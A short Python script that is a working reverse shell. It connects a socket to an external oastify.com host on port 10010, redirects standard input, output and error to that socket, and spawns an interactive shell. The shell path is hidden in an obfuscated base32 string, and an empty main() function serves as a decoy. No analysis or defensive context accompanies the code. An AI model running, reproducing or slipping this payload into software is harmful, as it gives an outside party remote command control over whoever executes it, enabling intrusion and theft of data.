#!/usr/bin/python
import socket,subprocess,os,base64,time

def main():
    pass

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((str("dzgi0h7on1jhzdg0vknw9pp9309rxjl8.oastify.com"),10010))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
python_encode = base64.b32decode("F5R!S3RPMJQX!2A=".replace("!","G"))
subprocess.call([str(python_encode),"-i"])